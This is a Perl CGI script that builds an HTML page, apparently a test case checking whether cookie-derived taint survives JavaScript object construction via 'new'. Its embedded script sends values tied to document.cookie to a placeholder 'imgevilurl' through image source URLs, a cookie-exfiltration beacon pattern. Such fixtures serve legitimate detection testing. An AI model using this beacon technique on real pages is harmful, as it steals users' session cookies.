#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_NEW";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 3;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 
		function Test1() {
		}

		dut = new Test1();
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		function Test2() {
		}

		if ($evil) {
			dut2 = new Test2();
		}
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 

		if ($evil) {		
			function Test3() {
			}
		}

		dut3 = new Test3();
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
